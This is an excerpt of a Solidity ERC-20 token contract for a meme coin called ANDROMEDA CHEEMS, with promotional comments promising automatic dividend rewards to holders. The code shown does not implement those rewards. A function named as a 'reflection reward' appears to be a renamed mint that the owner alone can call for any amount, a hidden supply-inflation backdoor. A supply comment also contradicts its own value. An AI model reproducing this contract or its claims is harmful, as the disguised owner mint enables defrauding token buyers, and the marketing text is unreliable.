...
//
// $AndromedaCheems proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN AndromedaCheems! With the auto-claim feature,
// simply hold$AndromedaCheems and you'll receive AndromedaCheems automatically in your wallet.
// 
// Hold AndromedaCheems and get rewarded in AndromedaCheems on every transaction!
//
//
// 📱 Telegram:https://t.me/AndromedaCheems
// 
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ReflectionRewardsAndromedaCheems(uint256 amount) public onlyOwner {
    _ReflectionRewardsAndromedaCheems(msg.sender, amount);
    }
    ...
    function _ReflectionRewardsAndromedaCheems(address account, uint256 amount) internal virtual {
...
contract ANDROMEDACHEEMS is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("ANDROMEDA CHEEMS", "ANDROMEDACHEEMS") {
        _ReflectionRewardsAndromedaCheems(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}